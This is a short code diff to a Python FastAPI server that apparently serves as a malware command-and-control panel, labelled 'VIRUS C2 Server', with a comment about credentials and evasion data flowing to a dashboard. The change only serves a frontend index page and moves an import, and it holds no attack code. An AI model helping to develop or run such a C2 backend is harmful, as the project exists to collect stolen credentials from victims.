@@ -11,7 +11,7 @@ Credentials and evasion data flow through Redis to the dashboard.
 
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, UploadFile, Body
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import HTMLResponse
+from fastapi.responses import HTMLResponse, FileResponse
 from fastapi.staticfiles import StaticFiles
 import uvicorn
 import asyncio
@@ -564,6 +564,9 @@ async def broadcast(payload: dict):
 
 @app.get("/", response_class=HTMLResponse)
 async def root():
+    index = os.path.join(dist_dir, "index.html")
+    if os.path.isfile(index):
+        return FileResponse(index)
     return HTMLResponse(content="<h1>VIRUS C2 Server</h1><p>OK</p>")
 
 
@@ -1866,7 +1869,6 @@ async def tools_cancel(execution_id: int):
 dist_dir = os.path.abspath("dist")
 if os.path.isdir(dist_dir):
     app.mount("/assets", StaticFiles(directory=os.path.join(dist_dir, "assets")), name="assets")
-    from fastapi.responses import FileResponse
     @app.get("/{full_path:path}")
     async def serve_spa(full_path: str):
         if full_path.startswith("api/") or full_path.startswith("ws/") or full_path.startswith("openapi") or full_path == "health":
